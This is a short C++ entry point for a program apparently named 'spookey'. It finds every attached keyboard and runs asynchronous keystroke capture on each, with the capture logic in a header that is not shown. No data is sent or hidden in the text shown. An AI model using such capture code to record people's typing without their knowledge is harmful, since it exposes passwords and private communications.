#include <future>
#include <string>
#include <vector>

#include "spookey.hh"

int main(int argc, char** argv) {
    // Parse command-line arguments
    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--debug") == 0) DEBUG = true;
    }

    // Find keyboards
    std::vector<Keyboard> keyboards = findKeyboards();
    int numKeyboards = keyboards.size();

    // Begin capturing keystrokes asynchronously
    std::vector<std::future<void>> captureTasks;
    for (auto& kbd : keyboards)
        captureTasks.push_back(
            std::async(std::launch::async, &Keyboard::capture, &kbd));

    // Do not exit unless all captures terminate
    for (const auto& task : captureTasks) task.wait();

    return 0;
}
